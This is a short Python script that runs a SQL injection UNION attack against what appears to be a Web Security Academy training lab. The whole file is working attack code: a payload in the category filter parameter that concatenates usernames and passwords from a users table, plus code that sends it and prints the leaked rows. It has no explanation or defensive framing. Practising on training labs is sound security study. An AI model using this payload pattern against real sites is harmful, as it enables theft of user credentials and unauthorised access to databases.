import requests


def unionAttack(url):
    category = "\'+UNION+SELECT+NULL,\'AAAA\'||username||\'~\'||password+FROM+users--"
    url1 = "https://acd61fda1f204d0bc0da763f008f0042.web-security-academy.net/"
    session = requests.session()
    session.get(url1)
    url = "https://acd61fda1f204d0bc0da763f008f0042.web-security-academy.net/filter?category={}".format(category)
    print(url)
    resp = session.get(url)
    for line in resp.iter_lines():
        if b"AAAA" in line:
            print(line)
    print("end of union attack")